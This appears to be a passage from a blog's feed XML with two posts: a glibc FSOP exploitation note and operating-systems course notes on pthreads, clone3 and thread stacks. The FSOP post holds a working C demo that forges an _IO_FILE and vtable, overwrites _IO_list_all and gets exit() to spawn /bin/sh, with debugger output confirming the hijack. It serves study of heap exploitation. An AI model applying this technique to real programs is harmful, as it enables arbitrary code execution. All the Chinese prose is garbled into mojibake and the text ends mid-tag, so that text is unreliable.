        <content type="html"><![CDATA[<h2 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h2><p>FSOPåˆ©ç”¨å‰æè¦æœ‰libcåœ°å€ï¼Œæ ¸å¿ƒå°±æ˜¯åŠ«æŒ_chainé“¾è¡¨å¤´_IO_list_allä¼ªé€ _IO_FILE é¡¹å’Œvtable</p><p>ä¹‹å‰exit()åˆ†ææ—¶ä¼š_IO_flush_all_lockp,é‡Œé¢ä¼šè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockpä¼šåœ¨ä»¥ä¸‹è§¦å‘</p><ol><li><p>å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶</p></li><li><p>å½“æ‰§è¡Œ exit å‡½æ•°æ—¶</p></li><li><p>å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶(å…¶å®ä¹Ÿæ˜¯æœ€åè°ƒç”¨exit)</p></li></ol><p>éœ€è¦ä¼ªé€ çš„_IO_FILEç»•è¿‡ä¸€ä¸‹æ¡ä»¶</p><ul><li>fp-&gt;_mode &lt;&#x3D; 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sh</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+vtable_offset)=((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span>*)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=sh;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="type">long</span> <span class="type">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_list_all</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_FILE_plus *) 0x602010</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x602110</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *(struct _IO_jump_t*)0x602110</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3 = &#123;</span></span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x4005b6 &lt;sh&gt;, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p sh</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4 = &#123;void ()&#125; 0x4005b6 &lt;sh&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/06/FSOP/image-20230406132711374.png" alt="image-20230406132711374"></p><p><img src="/2023/04/06/FSOP/image-20230406132733192.png" alt="image-20230406132733192"></p>]]></content>
      
      
      
        <tags>
            
            <tag> FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:å¤šå¤„ç†å™¨ç¼–ç¨‹</title>
      <link href="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/"/>
      <url>/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/3.slides#">http://jyywiki.cn/OS/2022/slides/3.slides#</a></p><h2 id="thread-h-ç®€åŒ–çš„çº¿ç¨‹-API"><a href="#thread-h-ç®€åŒ–çš„çº¿ç¨‹-API" class="headerlink" title="thread.h ç®€åŒ–çš„çº¿ç¨‹ API"></a><code>thread.h</code> ç®€åŒ–çš„çº¿ç¨‹ API</h2><p>è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œlinuxçº¿ç¨‹å…¶å®æ˜¯é€šè¿‡è½»é‡çº§è¿›ç¨‹å®ç°çš„LWP(light weight process)ï¼Œæ‰€æœ‰Linuxå†…æ ¸çš„è§’åº¦å»çœ‹çº¿ç¨‹å’Œè¿›ç¨‹å¹¶æ²¡æœ‰åŒºåˆ«ï¼Œåªä¸è¿‡ä»–å’Œä¸»çº¿ç¨‹å…±äº«ä¸€äº›èµ„æºï¼Œçº¿ç¨‹æ˜¯æœ€å°çš„æ‰§è¡Œå•ä½ï¼Œè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚åŒæ—¶ä¹Ÿæ˜¯èµ„æºç«äº‰çš„åŸºæœ¬å•ä½ã€‚</p><p>å…·ä½“çš„ä¸œè¥¿ä¹‹å‰ <a href="https://grxer.github.io/2023/03/26/TLS-Hijack/">https://grxer.github.io/2023/03/26/TLS-Hijack/</a> é‡Œæœ‰è®¨è®º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREAD 64</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id, status;</span><br><span class="line">  <span class="type">pthread_t</span> thread;</span><br><span class="line">  <span class="type">void</span> (*entry)(<span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">wrapper</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (<span class="keyword">struct</span> thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span> *fn)</span> &#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (<span class="keyword">struct</span> thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123; </span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>POSIXçº¿ç¨‹åº“è¿›ä¸€æ­¥åšäº†ä¸€å±‚å°è£…ï¼Œåšäº†ä¸ªmainå‡½æ•°çš„ææ„å‡½æ•°é˜»å¡è¿›ç¨‹ç­‰å¾…</p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">                 <span class="type">pthread_t</span> * tidp,   <span class="comment">//æ–°åˆ›å»ºçš„çº¿ç¨‹IDæŒ‡å‘çš„å†…å­˜å•å…ƒã€‚</span></span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="type">pthread_attr_t</span> * attr,  <span class="comment">//çº¿ç¨‹å±æ€§</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *(*start_rtn)(<span class="type">void</span> *), <span class="comment">//æ–°åˆ›å»ºçš„çº¿ç¨‹ä»start_rtnå‡½æ•°çš„åœ°å€å¼€å§‹è¿è¡Œ,ä½¿ç”¨å‚æ•°æ—¶æˆ‘ä»¬é€šå¸¸ä¼šè¿›è¡Œç±»å‹å¼ºè½¬</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> * arg <span class="comment">//è‹¥ä¸Šè¿°å‡½æ•°éœ€è¦å‚æ•°ï¼Œå°†å‚æ•°æ”¾å…¥ç»“æ„ä¸­å¹¶å°†åœ°å€ä½œä¸ºargä¼ å…¥ã€‚</span></span></span><br><span class="line"><span class="params">                  )</span>;<span class="comment">//åˆ›å»ºæˆåŠŸè¿”å›0ï¼Œå¦åˆ™è¿”å›é”™è¯¯ä¿¡æ¯å¯¹åº”çš„é0å®</span></span><br><span class="line"><span class="type">void</span>ç±»å‹çš„æŒ‡é’ˆé…åˆä¸Šç±»å‹å¼ºè½¬ç»™äº†æˆ‘ä»¬æ›´å¤šçš„çµæ´»æ€§å’Œè‡ªç”±æ€§</span><br><span class="line"><span class="type">pthread_t</span>ç±»å‹çš„çº¿ç¨‹tibpï¼Œæ˜¯è¿›ç¨‹å†…éƒ¨ï¼Œè¯†åˆ«æ ‡å¿—,ä¸¤ä¸ªè¿›ç¨‹é—´ï¼Œè¿™ä¸ªçº¿ç¨‹IDå…è®¸ç›¸åŒ</span><br><span class="line">pthread_createå‡½æ•°åˆ›å»ºçš„çº¿ç¨‹é»˜è®¤éåˆ†ç¦»å±æ€§çš„ï¼Œåœ¨éåˆ†ç¦»çš„æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªçº¿ç¨‹ç»“æŸçš„æ—¶å€™ï¼Œå®ƒæ‰€å ç”¨çš„ç³»ç»Ÿèµ„æºå¹¶æ²¡æœ‰å®Œå…¨çœŸæ­£çš„é‡Šæ”¾ï¼Œä¹Ÿæ²¡æœ‰çœŸæ­£ç»ˆæ­¢ã€‚</span><br><span class="line">åªæœ‰åœ¨pthread_joinå‡½æ•°è¿”å›æ—¶ï¼Œè¯¥çº¿ç¨‹æ‰ä¼šé‡Šæ”¾è‡ªå·±çš„èµ„æºã€‚æˆ–è€…æ˜¯è®¾ç½®åœ¨åˆ†ç¦»å±æ€§çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªçº¿ç¨‹ç»“æŸä¼šç«‹å³é‡Šæ”¾å®ƒæ‰€å ç”¨çš„èµ„æºã€‚</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> tid)</span>;åˆ†ç¦»ä¸€ä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªåˆ†ç¦»çš„çº¿ç¨‹æ˜¯ä¸èƒ½è¢«å…¶ä»–çº¿ç¨‹å›æ”¶æˆ–æ€æ­»çš„ã€‚å®ƒçš„å†…å­˜èµ„æºåœ¨å®ƒç»ˆæ­¢æ—¶ç”±ç³»ç»Ÿè‡ªåŠ¨é‡Šæ”¾ã€‚</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_join</span><span class="params">(<span class="type">pthread_t</span> thread, <span class="comment">//æŒ‡å®šç­‰å¾…å“ªä¸ªå­çº¿ç¨‹ç»“æŸï¼Œæ¥æ”¶å“ªä¸ªçº¿ç¨‹çš„è¿”å›å€¼ï¼Œåªèƒ½æ˜¯éåˆ†ç¦»çº¿ç¨‹</span></span></span><br><span class="line"><span class="params">                 <span class="type">void</span> ** retval<span class="comment">//æ¥æ”¶å‚æ•°è¿”å›å€¼</span></span></span><br><span class="line"><span class="params">                )</span>;<span class="comment">//æˆåŠŸè¿”å›0ï¼Œå¦åˆ™è¿”å›é”™è¯¯ä¿¡æ¯å¯¹åº”çš„é0å®</span></span><br><span class="line">ä¸€ç›´é˜»å¡è°ƒç”¨å®ƒçš„çº¿ç¨‹ï¼Œç›´è‡³ç›®æ ‡çº¿ç¨‹æ‰§è¡Œç»“æŸï¼ˆæ¥æ”¶åˆ°ç›®æ ‡çº¿ç¨‹çš„è¿”å›å€¼ï¼‰ï¼Œé˜»å¡çŠ¶æ€æ‰ä¼šè§£é™¤ã€‚</span><br><span class="line">å¦‚æœä¸€ä¸ªçº¿ç¨‹æ˜¯éåˆ†ç¦»çš„ï¼ˆé»˜è®¤æƒ…å†µä¸‹åˆ›å»ºçš„çº¿ç¨‹éƒ½æ˜¯éåˆ†ç¦»ï¼‰å¹¶ä¸”æ²¡æœ‰å¯¹è¯¥çº¿ç¨‹ä½¿ç”¨ pthread_join() çš„è¯ï¼Œè¯¥çº¿ç¨‹ç»“æŸåå¹¶ä¸ä¼šé‡Šæ”¾å…¶å†…å­˜(ç³»ç»Ÿ)ç©ºé—´ï¼Œè¿™ä¼šå¯¼è‡´è¯¥çº¿ç¨‹å˜æˆäº†â€œåƒµå°¸çº¿ç¨‹â€ã€‚joinåæˆ‘ä»¬ä¹Ÿå¿…é¡»æ‰‹åŠ¨æ¸…é™¤ç¨‹åºåˆ†é…çš„ç©ºé—´(å †ç­‰ç­‰)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>_attribute__å…³é”®å­—ä¸»è¦æ˜¯ç”¨æ¥åœ¨å‡½æ•°æˆ–æ•°æ®å£°æ˜ä¸­è®¾ç½®å…¶å±æ€§ã€‚ç»™å‡½æ•°èµ‹ç»™å±æ€§çš„ä¸»è¦ç›®çš„åœ¨äºè®©ç¼–è¯‘å™¨è¿›è¡Œä¼˜åŒ–ã€‚</p></li><li><p>ä½¿ç”¨ç¼–è¯‘æ—¶pthread åº“éœ€è¦åŠ ä¸Š-lpthreadï¼Œå› ä¸ºpthreadå¹¶éLinuxç³»ç»Ÿçš„é»˜è®¤åº“</p><blockquote><p>-lpthread é€‰é¡¹åªæ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨é“¾æ¥æ—¶é“¾æ¥ pthread åº“ã€‚</p><p>-pthread å°†è‡ªåŠ¨æ·»åŠ å¿…è¦çš„ç¼–è¯‘é€‰é¡¹å’Œé“¾æ¥é€‰é¡¹ï¼Œä»¥ç¡®ä¿ç¨‹åºæ­£ç¡®åœ°ä½¿ç”¨ pthread åº“,ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å°† â€œ-lpthreadâ€ é€‰é¡¹æ·»åŠ åˆ°é“¾æ¥å‘½ä»¤è¡Œä¸­ï¼Œä»¥ç¡®ä¿åœ¨é“¾æ¥æ—¶é“¾æ¥ pthread åº“ã€‚</p></blockquote></li></ul><h3 id="åˆ›å»ºçº¿ç¨‹ä½¿ç”¨çš„æ˜¯å“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼Ÿ"><a href="#åˆ›å»ºçº¿ç¨‹ä½¿ç”¨çš„æ˜¯å“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼Ÿ" class="headerlink" title="åˆ›å»ºçº¿ç¨‹ä½¿ç”¨çš„æ˜¯å“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼Ÿ"></a>åˆ›å»ºçº¿ç¨‹ä½¿ç”¨çš„æ˜¯å“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼Ÿ</h3><p>straceäº†ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7ffff73ff000</span><br><span class="line">mprotect(0x7ffff7400000, 8388608, PROT_READ|PROT_WRITE) = 0</span><br><span class="line">getrandom(&quot;\x5c\xf7\x7d\x5a\x8a\x60\xbd\x73&quot;, 8, GRND_NONBLOCK) = 8</span><br><span class="line">brk(NULL)                               = 0x555555559000</span><br><span class="line">brk(0x55555557a000)                     = 0x55555557a000</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, ~[], [], 8)   = 0</span><br><span class="line">clone3(&#123;flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x7ffff7bff910, parent_tid=0x7ffff7bff910, exit_signal=0, stack=0x7ffff73ff000, stack_size=0x7fff00, tls=0x7ffff7bff640&#125;gr</span><br><span class="line"> =&gt; &#123;parent_tid=[8670]&#125;, 88) = 8670</span><br></pre></td></tr></table></figure><p>gdbè·Ÿäº†ä¸€ä¸‹ï¼Œæœ€åç³»ç»Ÿè°ƒç”¨å‡½æ•°clong3è¿›å†…æ ¸syscallçš„æ—¶å€™æ˜¯ä¸€ä¸ªå¾ˆå¥‡æ€ªæœªçŸ¥çš„è°ƒç”¨å·</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215319891.png" alt="image-20230404215319891"></p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404215306823.png" alt="image-20230404215306823"></p><h3 id="gdbè°ƒè¯•å¤šçº¿ç¨‹"><a href="#gdbè°ƒè¯•å¤šçº¿ç¨‹" class="headerlink" title="gdbè°ƒè¯•å¤šçº¿ç¨‹"></a>gdbè°ƒè¯•å¤šçº¿ç¨‹</h3><p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Threads.html">https://sourceware.org/gdb/onlinedocs/gdb/Threads.html</a></p><h2 id="çº¿ç¨‹ç‹¬ç«‹çš„æ ˆåŒº"><a href="#çº¿ç¨‹ç‹¬ç«‹çš„æ ˆåŒº" class="headerlink" title="çº¿ç¨‹ç‹¬ç«‹çš„æ ˆåŒº"></a>çº¿ç¨‹ç‹¬ç«‹çš„æ ˆåŒº</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="type">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objdump to see how thread-local variables are implemented</span></span><br><span class="line">__attribute__((noinline)) <span class="type">void</span> <span class="title function_">set_cur</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123; cur = ptr; &#125;</span><br><span class="line">__attribute__((noinline)) <span class="type">char</span> *<span class="title function_">get_cur</span><span class="params">()</span>         &#123; <span class="keyword">return</span> cur; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stackoverflow</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">  set_cur(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> (n % <span class="number">1024</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> sz = base - get_cur();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack size of T%d &gt;= %d KB\n&quot;</span>, id, sz / <span class="number">1024</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stackoverflow(n + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tprobe</span><span class="params">(<span class="type">int</span> tid)</span> &#123;</span><br><span class="line">  id = tid;</span><br><span class="line">  base = (<span class="type">void</span> *)&amp;tid;</span><br><span class="line">  stackoverflow(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    create(Tprobe);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠŠè¾“å‡ºç¼“å†²åŒºå…³äº†ï¼Œèµ·äº†å››ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½ä¼šTprobeä½œä¸ºå…¥å£ç‚¹ï¼Œtidåœ¨ç›¸å¯¹é«˜åœ°å€æ ˆä¸Šï¼ŒæŠŠæ ˆåœ°å€ç»™äº†baseï¼Œè°ƒç”¨StackOverflow</p><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404185540104.png" alt="image-20230404185540104"></p><p>nå§‹ç»ˆåœ¨åœ¨æ ˆrbp-0x24åç§»å¤„ï¼Œæœ€åä¼šé€’å½’è‡ªå·±ï¼Œæ¯1024æ¬¡ä¼šè®¡ç®—ä¸€æ¬¡nè·ç¦»æ ˆåº•çš„è·ç¦»ï¼Œæ²¡æœ‰ç»ˆæ­¢æ¡ä»¶ï¼Œæ ˆä¸€ç›´åœ¨æ ˆï¼Œå§‹ç»ˆæœ‰ä¸€å¤©ä¼šçœŸæ­£çš„stackoverflowï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼°è®¡æ ˆçš„å¤§å°</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡pipe æŠŠç»“æœç»™sortæ’åº</p><p><code>./stack-probe | sort -nk 6</code></p><ul><li>-ké€‰æ‹©ä¸€åˆ—</li><li>-næŠŠæŸä¸€åˆ—å½“ä½œæ•°å­—æ’åº</li></ul><p><img src="/2023/04/05/NJUOS-%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%BC%96%E7%A8%8B/image-20230404195902138.png" alt="image-20230404195902138"></p><p>çŒœæµ‹å‡ºæ ˆçš„å¤§å°é»˜è®¤ä¹Ÿå°±æ˜¯8M</p><h3 id="çº¿ç¨‹å†…å­˜æ¨¡å‹"><a href="#çº¿ç¨‹å†…å­˜æ¨¡å‹" class="headerlink" title="çº¿ç¨‹å†…å­˜æ¨¡å‹"></a>çº¿ç¨‹å†…å­˜æ¨¡å‹</h3><p>ä¸€ç»„å¹¶å‘çº¿ç¨‹è¿è¡Œåœ¨ä¸€ä¸ªè¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­,å„è‡ªç‹¬ç«‹çš„çº¿ç¨‹æ ˆçš„å†…å­˜æ¨¡å‹ä¸æ˜¯é‚£ä¹ˆæ•´é½æ¸…æ¥šçš„ã€‚æ ˆè¢«ä¿å­˜åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ ˆåŒºåŸŸä¸­,çº¿ç¨‹æ ˆæ˜¯ä¸å¯¹å…¶ä»–çº¿ç¨‹è®¾é˜²çš„ï¼Œæ‰€ä»¥å¦‚æœä¸€ä¸ªçº¿ç¨‹å¾—åˆ°å¦ä¸€ä¸ªçº¿ç¨‹çš„æ ˆæŒ‡é’ˆï¼Œä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œè®¿é—®ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 